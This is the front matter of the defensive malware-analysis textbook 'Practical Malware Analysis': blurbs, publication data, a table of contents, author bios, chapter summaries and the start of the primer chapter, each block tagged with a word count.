Digital Forensics Book of the Year, FORENSIC 4CAST AWARDS 2013
[Word Count: 10]

“A hands-on introduction to malware analysis. I’d recommend it to anyone 
who wants to dissect Windows malware.”
—Ilfak Guilfanov, CREATOR OF IDA PRO
[Word Count: 23]

“The book every malware analyst should keep handy.” 
—Richard Bejtlich, CSO OF MANDIANT & FOUNDER OF TAOSECURITY
[Word Count: 17]

“This book does exactly what it promises on the cover; it’s crammed with 
detail and has an intensely practical approach, but it’s well organised enough 
that you can keep it around as handy reference.”
—Mary Branscombe, ZDNET
[Word Count: 37]

“If you’re starting out in malware analysis, or if you are are coming to analysis 
from another discipline, I’d recommend having a nose.”
—Paul Baccas, NAKED SECURITY FROM SOPHOS
[Word Count: 29]

“An excellent crash course in malware analysis.” 
—Dino Dai Zovi, INDEPENDENT SECURITY CONSULTANT
[Word Count: 13]

“The most comprehensive guide to analysis of malware, offering detailed 
coverage of all the essential skills required to understand the specific 
challenges presented by modern malware.”
—Chris Eagle, SENIOR LECTURER OF COMPUTER SCIENCE AT THE NAVAL 
POSTGRADUATE SCHOOL
[Word Count: 38]

“A great introduction to malware analysis. All chapters contain detailed 
technical explanations and hands-on lab exercises to get you immediate 
exposure to real malware.”
—Sebastian Porst, GOOGLE SOFTWARE ENGINEER
[Word Count: 29]

“Brings reverse-engineering to readers of all skill levels. Technically rich and 
accessible, the labs will lead you to a deeper understanding of the art and 
science of reverse-engineering. I strongly believe this will become the defacto 
text for learning malware analysis in the future.”
—Danny Quist, PHD, FOUNDER OF OFFENSIVE COMPUTING
[Word Count: 51]

“An awesome book . . . written by knowledgeable authors who possess 
the rare gift of being able to communicate their knowledge through the 
written word.”
—Richard Austin, IEEE CIPHER
[Word Count: 30]

“If you only read one malware book or are looking to break into the world of 
malware analysis, this is the book to get.” 
—Patrick Engebretson, IA PROFESSOR, DAKOTA STATE UNIVERSITY AND
[Word Count: 32]

AUTHOR OF The Basics of Hacking and Pen Testing
[Word Count: 9]

“An excellent addition to the course materials for an advanced graduate level 
course on Software Security or Intrusion Detection Systems. The labs are 
especially useful to students in teaching the methods to reverse-engineer, 
analyze, and understand malicious software.”
—Sal Stolfo, PROFESSOR, COLUMBIA UNIVERSITY
[Word Count: 43]

“The explanation of the tools is clear, the presentation of the process is 
lucid, and the actual detective work fascinating. All presented clearly and 
hitting just the right level so that developers with no previous experience in 
this particular area can participate fully. Highly recommended.”
—Dr. Dobb’s
[Word Count: 47]

“This book is like having your very own personal malware analysis teacher 
without the expensive training costs.”
—Dustin Schultz, THEXPLOIT
[Word Count: 20]

“I highly recommend this book to anyone looking to get their feet wet 
in malware analysis or just looking for a good desktop reference on the 
subject.”
—Pete Arzamendi, 403 LABS
[Word Count: 31]

“I do not see how anyone who has hands-on responsibility for security of 
Windows systems can rationalize not being familiar with these tools.”
—Stephen Northcutt, SANS INSTITUTE
[Word Count: 27]

The Hands-On Guide to 
Dissecting Malicious 
Software
[Word Count: 7]

PRACTICAL MALWARE ANALYSIS. Copyright © 2012 by Michael Sikorski and Andrew Honig.
[Word Count: 12]

All rights reserved. No part of this work may be reproduced or transmitted in any form or by any means, electronic or 
mechanical, including photocopying, recording, or by any information storage or retrieval system, without the prior 
written permission of the copyright owner and the publisher.
[Word Count: 46]

ISBN-10: 1-59327-290-1
ISBN-13: 978-1-59327-290-6
[Word Count: 4]

Publisher: William Pollock
Production Editor: Alison Law
Cover Illustration: Hugh D’Andrade
Interior Design: Octopod Studios
Developmental Editors: William Pollock and Tyler Ortman
Technical Reviewer: Stephen Lawler
Copyeditor: Marilyn Smith
Compositor: Riley Hoffman
Proofreader: Irene Barnard
Indexer: Nancy Guenther
[Word Count: 38]

For information on distribution, translations, or bulk sales, please contact No Starch Press, Inc. directly:
[Word Count: 15]

No Starch Press, Inc.
245 8th Street, San Francisco, CA 94103
phone: 1.415.863.9900; info@nostarch.com; www.nostarch.com
[Word Count: 15]

Library of Congress Cataloging-in-Publication Data
[Word Count: 5]

Sikorski, Michael.
  Practical malware analysis : the hands-on guide to dissecting malicious software / by Michael Sikorski, 
Andrew Honig.
       p. cm.
  ISBN 978-1-59327-290-6 -- ISBN 1-59327-290-1
 1.  Malware (Computer software) 2.  Computer viruses. 3.  Debugging in computer science. 4.  Computer security.  
I. Honig, Andrew. II. Title.
  QA76.76.C68S534 2012
  005.8'4--dc23
                                                            2012000214
[Word Count: 50]

No Starch Press and the No Starch Press logo are registered trademarks of No Starch Press, Inc. Other product and 
company names mentioned herein may be the trademarks of their respective owners. Rather than use a trademark 
symbol with every occurrence of a trademarked name, we are using the names only in an editorial fashion and to the 
benefit of the trademark owner, with no intention of infringement of the trademark.
[Word Count: 71]

The information in this book is distributed on an “As Is” basis, without warranty. While every precaution has been 
taken in the preparation of this work, neither the authors nor No Starch Press, Inc. shall have any liability to any 
person or entity with respect to any loss or damage caused or alleged to be caused directly or indirectly by the 
information contained in it.
[Word Count: 65]

About the Authors .........................................................................................................xix
[Word Count: 4]

Foreword by Richard Bejtlich ..........................................................................................xxi
[Word Count: 5]

Acknowledgments ........................................................................................................xxv
[Word Count: 2]

Introduction ............................................................................................................... xxvii
[Word Count: 3]

Chapter 0: Malware Analysis Primer .................................................................................1
[Word Count: 6]

Chapter 1: Basic Static Techniques....................................................................................9
[Word Count: 5]

Chapter 2: Malware Analysis in Virtual Machines.............................................................29
[Word Count: 7]

Chapter 3: Basic Dynamic Analysis.................................................................................39
[Word Count: 5]

Chapter 4: A Crash Course in x86 Disassembly ...............................................................65
[Word Count: 9]

Chapter 5: IDA Pro .......................................................................................................87
[Word Count: 5]

Chapter 6: Recognizing C Code Constructs in Assembly..................................................109
[Word Count: 8]

Chapter 7: Analyzing Malicious Windows Programs.......................................................135
[Word Count: 6]

Chapter 8: Debugging.................................................................................................167
[Word Count: 3]

Chapter 9: OllyDbg ....................................................................................................179
[Word Count: 4]

Chapter 10: Kernel Debugging with WinDbg.................................................................205
[Word Count: 6]

Chapter 11: Malware Behavior ....................................................................................231
[Word Count: 5]

Chapter 12: Covert Malware Launching ........................................................................253
[Word Count: 6]

Chapter 13: Data Encoding .........................................................................................269
[Word Count: 5]

Chapter 14: Malware-Focused Network Signatures.........................................................297
[Word Count: 5]

Chapter 15: Anti-Disassembly.......................................................................................327
[Word Count: 3]

Chapter 16: Anti-Debugging ........................................................................................351
[Word Count: 4]

Chapter 17: Anti-Virtual Machine Techniques .................................................................369
[Word Count: 6]

Chapter 18: Packers and Unpacking.............................................................................383
[Word Count: 5]

Chapter 19: Shellcode Analysis ....................................................................................407
[Word Count: 5]

Chapter 20: C++ Analysis ...........................................................................................427
[Word Count: 5]

Chapter 21: 64-Bit Malware.........................................................................................441
[Word Count: 4]

Appendix A: Important Windows Functions....................................................................453
[Word Count: 5]

Appendix B: Tools for Malware Analysis........................................................................465
[Word Count: 6]

Appendix C: Solutions to Labs ......................................................................................477
[Word Count: 6]

Index.........................................................................................................................733
[Word Count: 1]

About the Technical Reviewer ................................................................................... xx
About the Contributing Authors ................................................................................. xx
[Word Count: 12]

Individual Thanks ...................................................................................................xxv
[Word Count: 3]

What Is Malware Analysis? .................................................................................. xxviii
Prerequisites ....................................................................................................... xxviii
Practical, Hands-On Learning .................................................................................xxix
What’s in the Book? ...............................................................................................xxx
[Word Count: 18]

The Goals of Malware Analysis ................................................................................. 1
Malware Analysis Techniques .................................................................................... 2
Basic Static Analysis .................................................................................... 2
Basic Dynamic Analysis ............................................................................... 2
Advanced Static Analysis ............................................................................. 3
Advanced Dynamic Analysis ........................................................................ 3
Types of Malware .................................................................................................... 3
General Rules for Malware Analysis ........................................................................... 5
[Word Count: 44]

Antivirus Scanning: A Useful First Step ...................................................................... 10
Hashing: A Fingerprint for Malware ......................................................................... 10
Finding Strings ....................................................................................................... 11
Packed and Obfuscated Malware ............................................................................ 13
Packing Files ............................................................................................ 13
Detecting Packers with PEiD ........................................................................ 14
Portable Executable File Format ................................................................................ 14
Linked Libraries and Functions .................................................................................. 15
Static, Runtime, and Dynamic Linking ........................................................... 15
[Word Count: 54]

Exploring Dynamically Linked Functions with Dependency Walker .................. 16
Imported Functions .................................................................................... 18
Exported Functions .................................................................................... 18
Static Analysis in Practice ........................................................................................ 18
PotentialKeylogger.exe: An Unpacked Executable ......................................... 18
PackedProgram.exe: A Dead End ............................................................... 21
The PE File Headers and Sections ............................................................................. 21
Examining PE Files with PEview ................................................................... 22
Viewing the Resource Section with Resource Hacker ...................................... 25
Using Other PE File Tools ........................................................................... 26
PE Header Summary .................................................................................. 26
Conclusion ............................................................................................................ 26
Labs ..................................................................................................................... 27
[Word Count: 77]

2
MALWARE ANALYSIS IN VIRTUAL MACHINES
29
[Word Count: 7]

The Structure of a Virtual Machine ............................................................................ 30
Creating Your Malware Analysis Machine ................................................................ 31
Configuring VMware ................................................................................. 31
Using Your Malware Analysis Machine ..................................................................... 34
Connecting Malware to the Internet ............................................................. 34
Connecting and Disconnecting Peripheral Devices ......................................... 34
Taking Snapshots ...................................................................................... 35
Transferring Files from a Virtual Machine ..................................................... 36
The Risks of Using VMware for Malware Analysis ...................................................... 36
Record/Replay: Running Your Computer in Reverse .................................................... 37
Conclusion ............................................................................................................ 37
[Word Count: 73]

Sandboxes: The Quick-and-Dirty Approach ............................................................... 40
Using a Malware Sandbox ......................................................................... 40
Sandbox Drawbacks ................................................................................. 41
Running Malware ................................................................................................... 42
Monitoring with Process Monitor .............................................................................. 43
The Procmon Display ................................................................................. 44
Filtering in Procmon ................................................................................... 44
Viewing Processes with Process Explorer ................................................................... 47
The Process Explorer Display ...................................................................... 47
Using the Verify Option ............................................................................. 48
Comparing Strings .................................................................................... 49
Using Dependency Walker ......................................................................... 49
Analyzing Malicious Documents .................................................................. 50
Comparing Registry Snapshots with Regshot .............................................................. 50
[Word Count: 76]

Faking a Network .................................................................................................. 51
Using ApateDNS ...................................................................................... 51
Monitoring with Netcat .............................................................................. 52
Packet Sniffing with Wireshark ................................................................................. 53
Using INetSim ........................................................................................................ 55
Basic Dynamic Tools in Practice ............................................................................... 56
Conclusion ............................................................................................................ 60
Labs ..................................................................................................................... 61
[Word Count: 37]

Levels of Abstraction ............................................................................................... 66
Reverse-Engineering ............................................................................................... 67
The x86 Architecture .............................................................................................. 68
Main Memory ........................................................................................... 69
Instructions ............................................................................................... 69
Opcodes and Endianness ........................................................................... 70
Operands ................................................................................................ 70
Registers .................................................................................................. 71
Simple Instructions ..................................................................................... 73
The Stack ................................................................................................. 77
Conditionals ............................................................................................. 80
Branching ................................................................................................ 80
Rep Instructions ......................................................................................... 81
C Main Method and Offsets ....................................................................... 83
More Information: Intel x86 Architecture Manuals ......................................... 85
Conclusion ............................................................................................................ 85
[Word Count: 67]

Loading an Executable ............................................................................................ 88
The IDA Pro Interface .............................................................................................. 89
Disassembly Window Modes ...................................................................... 89
Useful Windows for Analysis ...................................................................... 91
Returning to the Default View ...................................................................... 92
Navigating IDA Pro ................................................................................... 92
Searching ................................................................................................ 94
Using Cross-References ........................................................................................... 95
Code Cross-References .............................................................................. 95
Data Cross-References ............................................................................... 96
Analyzing Functions ............................................................................................... 97
Using Graphing Options ......................................................................................... 98
[Word Count: 58]

Enhancing Disassembly ......................................................................................... 100
Renaming Locations ................................................................................. 100
Comments .............................................................................................. 100
Formatting Operands ............................................................................... 100
Using Named Constants .......................................................................... 102
Redefining Code and Data ....................................................................... 103
Extending IDA with Plug-ins ................................................................................... 103
Using IDC Scripts .................................................................................... 104
Using IDAPython ..................................................................................... 105
Using Commercial Plug-ins ....................................................................... 106
Conclusion .......................................................................................................... 106
Labs ................................................................................................................... 107
[Word Count: 52]

6
RECOGNIZING C CODE CONSTRUCTS IN ASSEMBLY
109
[Word Count: 8]

Global vs. Local Variables ..................................................................................... 110
Disassembling Arithmetic Operations ...................................................................... 112
Recognizing if Statements ...................................................................................... 113
Analyzing Functions Graphically with IDA Pro ............................................ 114
Recognizing Nested if Statements .............................................................. 114
Recognizing Loops ............................................................................................... 116
Finding for Loops .................................................................................... 116
Finding while Loops ................................................................................. 118
Understanding Function Call Conventions ................................................................ 119
cdecl ..................................................................................................... 119
stdcall .................................................................................................... 120
fastcall ................................................................................................... 120
Push vs. Move ......................................................................................... 120
Analyzing switch Statements .................................................................................. 121
If Style ................................................................................................... 122
Jump Table ............................................................................................. 123
Disassembling Arrays ........................................................................................... 127
Identifying Structs ................................................................................................. 128
Analyzing Linked List Traversal ............................................................................... 130
Conclusion .......................................................................................................... 132
Labs ................................................................................................................... 133
[Word Count: 97]

7
ANALYZING MALICIOUS WINDOWS PROGRAMS
135
[Word Count: 6]

The Windows API ................................................................................................ 136
Types and Hungarian Notation ................................................................. 136
Handles ................................................................................................. 137
File System Functions ............................................................................... 137
Special Files ........................................................................................... 138
The Windows Registry .......................................................................................... 139
Registry Root Keys ................................................................................... 140
Regedit .................................................................................................. 140
Programs that Run Automatically ............................................................... 140
Common Registry Functions ...................................................................... 141
[Word Count: 47]

Analyzing Registry Code in Practice .......................................................... 141
Registry Scripting with .reg Files ................................................................ 142
Networking APIs .................................................................................................. 143
Berkeley Compatible Sockets .................................................................... 143
The Server and Client Sides of Networking ................................................. 144
The WinINet API ..................................................................................... 145
Following Running Malware .................................................................................. 145
DLLs ....................................................................................................... 145
Processes ............................................................................................... 147
Threads .................................................................................................. 149
Interprocess Coordination with Mutexes ..................................................... 151
Services ................................................................................................. 152
The Component Object Model .................................................................. 154
Exceptions: When Things Go Wrong ......................................................... 157
Kernel vs. User Mode ........................................................................................... 158
The Native API ..................................................................................................... 159
Conclusion .......................................................................................................... 161
Labs ................................................................................................................... 162
[Word Count: 90]

Source-Level vs. Assembly-Level Debuggers .............................................................. 168
Kernel vs. User-Mode Debugging ........................................................................... 168
Using a Debugger ................................................................................................ 169
Single-Stepping ....................................................................................... 169
Stepping-Over vs. Stepping-Into ................................................................ 170
Pausing Execution with Breakpoints ........................................................... 171
Exceptions ........................................................................................................... 175
First- and Second-Chance Exceptions ......................................................... 176
Common Exceptions ................................................................................ 176
Modifying Execution with a Debugger .................................................................... 177
Modifying Program Execution in Practice ................................................................ 177
Conclusion .......................................................................................................... 178
[Word Count: 61]

Loading Malware ................................................................................................. 180
Opening an Executable ........................................................................... 180
Attaching to a Running Process ................................................................. 181
The OllyDbg Interface ........................................................................................... 181
Memory Map ...................................................................................................... 183
Rebasing ................................................................................................ 184
Viewing Threads and Stacks .................................................................................. 185
Executing Code ................................................................................................... 186
[Word Count: 38]

Breakpoints ......................................................................................................... 188
Software Breakpoints ............................................................................... 188
Conditional Breakpoints ........................................................................... 189
Hardware Breakpoints ............................................................................. 190
Memory Breakpoints ................................................................................ 190
Loading DLLs ....................................................................................................... 191
Tracing ............................................................................................................... 192
Standard Back Trace ............................................................................... 192
Call Stack .............................................................................................. 193
Run Trace ............................................................................................... 193
Tracing Poison Ivy ................................................................................... 193
Exception Handling .............................................................................................. 194
Patching .............................................................................................................. 195
Analyzing Shellcode ............................................................................................. 196
Assistance Features .............................................................................................. 197
Plug-ins ............................................................................................................... 197
OllyDump ............................................................................................... 198
Hide Debugger ....................................................................................... 198
Command Line ........................................................................................ 198
Bookmarks ............................................................................................. 199
Scriptable Debugging ........................................................................................... 200
Conclusion .......................................................................................................... 201
Labs ................................................................................................................... 202
[Word Count: 86]

Downloaders and Launchers .................................................................................. 231
Backdoors ........................................................................................................... 232
Reverse Shell .......................................................................................... 232
RATs ...................................................................................................... 233
Botnets ................................................................................................... 234
RATs and Botnets Compared .................................................................... 234
Credential Stealers ............................................................................................... 234
GINA Interception ................................................................................... 235
Hash Dumping ........................................................................................ 236
Keystroke Logging ................................................................................... 238
Persistence Mechanisms ........................................................................................ 241
The Windows Registry ............................................................................. 241
Trojanized System Binaries ....................................................................... 243
DLL Load-Order Hijacking ......................................................................... 244
Privilege Escalation .............................................................................................. 245
Using SeDebugPrivilege ........................................................................... 246
Covering Its Tracks—User-Mode Rootkits ................................................................. 247
IAT Hooking ........................................................................................... 248
Inline Hooking ........................................................................................ 248
Conclusion .......................................................................................................... 250
Labs ................................................................................................................... 251
[Word Count: 87]

Launchers ............................................................................................................ 253
Process Injection ................................................................................................... 254
DLL Injection ........................................................................................... 254
Direct Injection ........................................................................................ 257
Process Replacement ............................................................................................ 257
Hook Injection ..................................................................................................... 259
Local and Remote Hooks .......................................................................... 260
Keyloggers Using Hooks .......................................................................... 260
Using SetWindowsHookEx ....................................................................... 260
Thread Targeting ..................................................................................... 261
Detours ............................................................................................................... 262
APC Injection ....................................................................................................... 262
APC Injection from User Space ................................................................. 263
APC Injection from Kernel Space ............................................................... 264
Conclusion .......................................................................................................... 265
Labs ................................................................................................................... 266
[Word Count: 69]

The Goal of Analyzing Encoding Algorithms ........................................................... 270
Simple Ciphers .................................................................................................... 270
Caesar Cipher ........................................................................................ 270
XOR ...................................................................................................... 271
Other Simple Encoding Schemes ............................................................... 276
Base64 .................................................................................................. 277
Common Cryptographic Algorithms ........................................................................ 280
Recognizing Strings and Imports ............................................................... 281
Searching for Cryptographic Constants ...................................................... 282
Searching for High-Entropy Content ........................................................... 283
Custom Encoding ................................................................................................. 285
Identifying Custom Encoding .................................................................... 285
Advantages of Custom Encoding to the Attacker ......................................... 288
Decoding ............................................................................................................ 288
Self-Decoding ......................................................................................... 288
Manual Programming of Decoding Functions .............................................. 289
Using Instrumentation for Generic Decryption ............................................. 291
Conclusion .......................................................................................................... 294
Labs ................................................................................................................... 295
[Word Count: 95]

14
MALWARE-FOCUSED NETWORK SIGNATURES
297
[Word Count: 5]

Understanding Anti-Disassembly ............................................................................. 328
Defeating Disassembly Algorithms .......................................................................... 329
Linear Disassembly .................................................................................. 329
Flow-Oriented Disassembly ....................................................................... 331
Anti-Disassembly Techniques .................................................................................. 334
Jump Instructions with the Same Target ....................................................... 334
A Jump Instruction with a Constant Condition .............................................. 336
Impossible Disassembly ............................................................................ 337
NOP-ing Out Instructions with IDA Pro ....................................................... 340
Obscuring Flow Control ........................................................................................ 340
The Function Pointer Problem .................................................................... 340
Adding Missing Code Cross-References in IDA Pro ...................................... 342
Return Pointer Abuse ................................................................................ 342
Misusing Structured Exception Handlers ..................................................... 344
Thwarting Stack-Frame Analysis ............................................................................. 347
Conclusion .......................................................................................................... 349
Labs ................................................................................................................... 350
[Word Count: 92]

Windows Debugger Detection ............................................................................... 352
Using the Windows API ........................................................................... 352
Manually Checking Structures ................................................................... 353
Checking for System Residue .................................................................... 356
Identifying Debugger Behavior ............................................................................... 356
INT Scanning .......................................................................................... 357
Performing Code Checksums .................................................................... 357
Timing Checks ........................................................................................ 357
Interfering with Debugger Functionality ................................................................... 359
Using TLS Callbacks ................................................................................ 359
Using Exceptions ..................................................................................... 361
Inserting Interrupts ................................................................................... 362
Debugger Vulnerabilities ....................................................................................... 363
PE Header Vulnerabilities ......................................................................... 363
The OutputDebugString Vulnerability ......................................................... 365
Conclusion .......................................................................................................... 365
Labs ................................................................................................................... 367
[Word Count: 79]

VMware Artifacts ................................................................................................. 370
Bypassing VMware Artifact Searching ....................................................... 372
Checking for Memory Artifacts .................................................................. 373
[Word Count: 16]

Vulnerable Instructions .......................................................................................... 373
Using the Red Pill Anti-VM Technique ......................................................... 374
Using the No Pill Technique ...................................................................... 375
Querying the I/O Communication Port ..................................................... 375
Using the str Instruction ............................................................................ 377
Anti-VM x86 Instructions .......................................................................... 377
Highlighting Anti-VM in IDA Pro ................................................................ 377
Using ScoopyNG .................................................................................... 379
Tweaking Settings ................................................................................................ 379
Escaping the Virtual Machine ................................................................................ 380
Conclusion .......................................................................................................... 380
Labs ................................................................................................................... 381
[Word Count: 64]

Loading Shellcode for Analysis .............................................................................. 408
[Word Count: 6]

Position-Independent Code .................................................................................... 408
Identifying Execution Location ................................................................................ 409
Using call/pop ....................................................................................... 409
Using fnstenv .......................................................................................... 411
Manual Symbol Resolution .................................................................................... 413
Finding kernel32.dll in Memory ................................................................ 413
Parsing PE Export Data ............................................................................ 415
Using Hashed Exported Names ................................................................ 417
A Full Hello World Example .................................................................................. 418
Shellcode Encodings ............................................................................................. 421
NOP Sleds .......................................................................................................... 422
Finding Shellcode ................................................................................................. 423
Conclusion .......................................................................................................... 424
Labs ................................................................................................................... 425
[Word Count: 65]

Object-Oriented Programming ............................................................................... 427
The this Pointer ....................................................................................... 428
Overloading and Mangling ...................................................................... 430
Inheritance and Function Overriding .......................................................... 432
Virtual vs. Nonvirtual Functions .............................................................................. 432
Use of Vtables ........................................................................................ 434
Recognizing a Vtable .............................................................................. 435
Creating and Destroying Objects ........................................................................... 437
Conclusion .......................................................................................................... 438
Labs ................................................................................................................... 439
[Word Count: 48]

Why 64-Bit Malware? .......................................................................................... 442
Differences in x64 Architecture .............................................................................. 443
Differences in the x64 Calling Convention and Stack Usage ......................... 444
64-Bit Exception Handling ........................................................................ 447
Windows 32-Bit on Windows 64-Bit ....................................................................... 447
64-Bit Hints at Malware Functionality ...................................................................... 448
Conclusion .......................................................................................................... 449
Labs ................................................................................................................... 450
[Word Count: 47]

Lab 1-1 ........................................477
Lab 1-2 ........................................479
Lab 1-3 ........................................480
Lab 1-4 ........................................481
[Word Count: 12]

Lab 3-1 ........................................482
Lab 3-2 ........................................485
Lab 3-3 ........................................490
Lab 3-4 ........................................492
[Word Count: 12]

Lab 5-1 ........................................494
[Word Count: 3]

Lab 6-1 ........................................501
Lab 6-2 ........................................503
Lab 6-3 ........................................507
Lab 6-4 ........................................511
[Word Count: 12]

Lab 7-1 ........................................513
Lab 7-2 ........................................517
Lab 7-3 ........................................519
[Word Count: 9]

Lab 9-1 ........................................530
Lab 9-2 ........................................539
Lab 9-3 ........................................545
[Word Count: 9]

Lab 10-1 ......................................548
Lab 10-2 ......................................554
Lab 10-3 ......................................560
[Word Count: 9]

Lab 11-1 ......................................566
Lab 11-2 ......................................571
Lab 11-3 ......................................581
[Word Count: 9]

Lab 12-1 ......................................586
Lab 12-2 ......................................590
Lab 12-3 ......................................597
Lab 12-4 ......................................599
[Word Count: 12]

Lab 13-1 ...................................... 607
Lab 13-2 ...................................... 612
Lab 13-3 ...................................... 617
[Word Count: 12]

Lab 14-1 ...................................... 626
Lab 14-2 ...................................... 632
Lab 14-3 ...................................... 637
[Word Count: 12]

Lab 15-1 ...................................... 645
Lab 15-2 ...................................... 646
Lab 15-3 ...................................... 652
[Word Count: 12]

Lab 16-1 ...................................... 655
Lab 16-2 ...................................... 660
Lab 16-3 ...................................... 665
[Word Count: 12]

Lab 17-1 ...................................... 670
Lab 17-2 ...................................... 673
Lab 17-3 ...................................... 678
[Word Count: 12]

Lab 18-1 ...................................... 684
Lab 18-2 ...................................... 685
Lab 18-3 ...................................... 686
Lab 18-4 ...................................... 689
Lab 18-5 ...................................... 691
[Word Count: 20]

Lab 19-1 ...................................... 696
Lab 19-2 ...................................... 699
Lab 19-3 ...................................... 703
[Word Count: 12]

Lab 20-1 ...................................... 712
Lab 20-2 ...................................... 713
Lab 20-3 ...................................... 717
[Word Count: 12]

Lab 21-1 ...................................... 723
Lab 21-2 ...................................... 728
[Word Count: 8]

Andrew Honig is an information assurance expert for the Department of 
Defense. He teaches courses on software analysis, reverse-engineering, and 
Windows system programming at the National Cryptologic School and is a 
Certified Information Systems Security Professional. Andy is publicly cred-
ited with several zero-day exploits in VMware’s virtualization products and 
has developed tools for detecting innovative malicious software, including 
malicious software in the kernel. An expert in analyzing and understanding 
both malicious and non-malicious software, he has over 10 years of experi-
ence as an analyst in the computer security industry.
[Word Count: 91]

Jerrold “Jay” Smith is a principal consultant at Mandiant, where he special-
izes in malware reverse-engineering and forensic analysis. In this role, he has 
contributed to many incident responses assisting a range of clients from 
Fortune 500 companies. Prior to joining Mandiant, Jay was with the NSA, but 
he’s not allowed to talk about that. Jay holds a bachelor’s degree in electrical 
engineering and computer science from UC Berkeley and a master’s degree 
in computer science from Johns Hopkins University.
[Word Count: 80]

Few areas of digital security seem as asymmetric as 
those involving malware, defensive tools, and operat-
ing systems.
[Word Count: 18]

1. http://www.informit.com/articles/article.aspx?p=1686289
[Word Count: 2]

500:1
Simple text editor to average malware
[Word Count: 7]

2,000:1
Malware suite to average malware
[Word Count: 6]

100,000:1
Defensive tool to average malware
[Word Count: 6]

1,000,000:1
Target operating system to average malware
[Word Count: 7]

2. http://git.gnome.org/browse/gedit/tree/gedit?id=3.3.1
[Word Count: 2]

Richard Bejtlich (@taosecurity)
Chief Security Officer, Mandiant and Founder of TaoSecurity
Manassas Park, Virginia
January 2, 2012
[Word Count: 17]

3. http://dl.packetstormsecurity.net/papers/virus/Sophail.pdf
[Word Count: 2]

Thanks to Lindsey Lack, Nick Harbour, and Jerrold “Jay” Smith for contrib-
uting chapters in their areas of expertise. Thanks to our technical reviewer 
Stephen Lawler who single-handedly reviewed over 50 labs and all of our 
chapters. Thanks to Seth Summersett, William Ballenthin, and Stephen 
Davis for contributing code for this book.
Special thanks go to everyone at No Starch Press for their effort. Alison, 
Bill, Travis, and Tyler: we were glad to work with you and everyone else at 
No Starch Press.
[Word Count: 83]

Mike: I dedicate this book to Rebecca—I couldn’t have done this without 
having such a supportive and loving person in my life.
[Word Count: 22]

Andy: I’d like to thank Molly, Claire, and Eloise for being the best family a 
guy could have.
[Word Count: 18]

Regardless of your background or experience with malware analysis, you’ll 
find something useful in this book. 
Chapters 1 through 3 discuss basic malware analysis techniques that 
even those with no security or programming experience will be able to use 
to perform malware triage. Chapters 4 through 14 cover more intermediate
[Word Count: 50]

Practical Malware Analysis begins with easy methods that can be used to get 
information from relatively unsophisticated malicious programs, and pro-
ceeds with increasingly complicated techniques that can be used to tackle 
even the most sophisticated malicious programs. Here’s what you’ll find in 
each chapter:
[Word Count: 45]


Chapter 0, “Malware Analysis Primer,” establishes the overall process and 
methodology of analyzing malware.
[Word Count: 15]


Chapter 1, “Basic Static Techniques,” teaches ways to get information 
from an executable without running it.
[Word Count: 17]


Chapter 2, “Malware Analysis in Virtual Machines,” walks you through 
setting up virtual machines to use as a safe environment for running 
malware.
[Word Count: 24]


Chapter 3, “Basic Dynamic Analysis,” teaches easy-to-use but effective 
techniques for analyzing a malicious program by running it.
[Word Count: 19]


Chapter 4, “A Crash Course in x86 Assembly,” is an introduction to the 
x86 assembly language, which provides a foundation for using IDA Pro 
and performing in-depth analysis of malware.
[Word Count: 31]


Chapter 5, “IDA Pro,” shows you how to use IDA Pro, one of the most 
important malware analysis tools. We’ll use IDA Pro throughout the 
remainder of the book.
[Word Count: 30]


Chapter 6, “Recognizing C Code Constructs in Assembly,” provides 
examples of C code in assembly and teaches you how to understand 
the high-level functionality of assembly code.
[Word Count: 28]


Chapter 7, “Analyzing Malicious Windows Programs,” covers a wide range 
of Windows-specific concepts that are necessary for understanding mali-
cious Windows programs.
[Word Count: 23]


Chapter 8, “Debugging,” explains the basics of debugging and how to 
use a debugger for malware analysts.
[Word Count: 18]


Chapter 9, “OllyDbg,” shows you how to use OllyDbg, the most popular 
debugger for malware analysts.
[Word Count: 17]


Chapter 10, “Kernel Debugging with WinDbg,” covers how to use the 
WinDbg debugger to analyze kernel-mode malware and rootkits.
[Word Count: 20]


Chapter 11, “Malware Behavior,” describes common malware functional-
ity and shows you how to recognize that functionality when analyzing 
malware.
[Word Count: 21]


Chapter 12, “Covert Malware Launching,” discusses how to analyze a par-
ticularly stealthy class of malicious programs that hide their execution 
within another process.
[Word Count: 25]


Chapter 13, “Data Encoding,” demonstrates how malware may encode 
data in order to make it harder to identify its activities in network traffic 
or on the victim host.
[Word Count: 29]


Chapter 14, “Malware-Focused Network Signatures,” teaches you how to 
use malware analysis to create network signatures that outperform signa-
tures made from captured traffic alone.
[Word Count: 26]


Chapter 15, “Anti-Disassembly,” explains how some malware authors 
design their malware so that it is hard to disassemble, and how to recog-
nize and defeat these techniques.
[Word Count: 28]


Chapter 16, “Anti-Debugging,” describes the tricks that malware authors 
use to make their code difficult to debug and how to overcome those 
roadblocks.
[Word Count: 24]


Chapter 17, “Anti-Virtual Machine Techniques,” demonstrates tech-
niques used by malware to make it difficult to analyze in a virtual 
machine and how to bypass those techniques.
[Word Count: 28]


Chapter 18, “Packers and Unpacking,” teaches you how malware uses 
packing to hide its true purpose, and then provides a step-by-step 
approach for unpacking packed programs.
[Word Count: 27]


Chapter 19, “Shellcode Analysis,” explains what shellcode is and presents 
tips and tricks specific to analyzing malicious shellcode.
[Word Count: 19]


Chapter 20, “C++ Analysis,” instructs you on how C++ code looks differ-
ent once it is compiled and how to perform analysis on malware created 
using C++.
[Word Count: 28]


Chapter 21, “64-Bit Malware,” discusses why malware authors may use 64-bit 
malware and what you need to know about the differences between x86 
and x64.
[Word Count: 26]


Appendix A, “Important Windows Functions,” briefly describes Windows 
functions commonly used in malware.
[Word Count: 14]


Appendix B, “Tools for Malware Analysis,” lists useful tools for malware 
analysts.
[Word Count: 13]


Appendix C, “Solutions to Labs,” provides the solutions for the labs 
included in the chapters throughout the book.
[Word Count: 19]

Our goal throughout this book is to arm you with the skills to analyze 
and defeat malware of all types. As you’ll see, we cover a lot of material and 
use labs to reinforce the material. By the time you’ve finished this book, you 
will have learned the skills you need to analyze any malware, including simple 
techniques for quickly analyzing ordinary malware and complex, sophisti-
cated ones for analyzing even the most enigmatic malware.
Let’s get started.
[Word Count: 78]

M A L W A R E  A N A L Y S I S  P R I M E R
[Word Count: 21]

Before we get into the specifics of how to analyze mal-
ware, we need to define some terminology, cover com-
mon types of malware, and introduce the fundamental 
approaches to malware analysis. Any software that does 
something that causes detriment to the user, computer, or network—such as 
viruses, trojan horses, worms, rootkits, scareware, and spyware—can be con-
sidered malware. While malware appears in many different forms, common 
techniques are used to analyze malware. Your choice of which technique to 
employ will depend on your goals.
[Word Count: 85]

The purpose of malware analysis is usually to provide the information you 
